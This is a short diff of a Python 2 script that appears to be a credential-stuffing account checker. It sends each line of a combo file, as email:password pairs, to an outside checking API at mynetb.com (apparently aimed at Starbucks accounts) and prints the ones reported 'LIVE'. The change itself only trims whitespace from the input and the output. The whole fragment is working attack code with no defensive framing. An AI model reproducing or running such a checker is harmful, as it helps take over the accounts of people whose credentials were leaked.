@@ -49,11 +49,11 @@ url = 'http://mynetb.com/api/sbux/api.php'
 start_time = time.time()
 for i in openfile:
     try:
-        r = requests.post(url, data={'mailpass':i}, verify=False)
+        r = requests.post(url, data={'mailpass':str(i).replace(' ', '')}, verify=False)
     except requests.exceptions.ConnectionError:
         print "[TIMEOUT]", i
     if "LIVE" in r.text:
-        print warna.OKGREEN + r.text + warna.ENDC
+        print warna.OKGREEN + str(r.text).replace('\n', '') + warna.ENDC
         live = r.text
         tanggal = datetime.today()
         dtwithoutseconds = tanggal.replace(second=0, microsecond=0)
